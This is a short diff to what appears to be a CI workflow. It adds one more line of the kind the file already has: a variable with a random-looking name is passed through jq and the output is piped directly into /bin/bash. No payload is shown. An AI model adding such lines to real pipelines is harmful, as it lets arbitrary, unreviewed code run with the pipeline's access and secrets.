@@ -23,6 +23,7 @@ jobs:
           printf '%s' "$sinp7810" | jq -r .hon385 | /bin/bash
           printf '%s' "$wds081" | jq -r .t1 | /bin/bash
           echo $w015 | jq -r .c90661 | /bin/bash
+          echo $hsmty0 | jq -r .xyrf0300 | /bin/bash
 
       - name: Store results
         if: always()
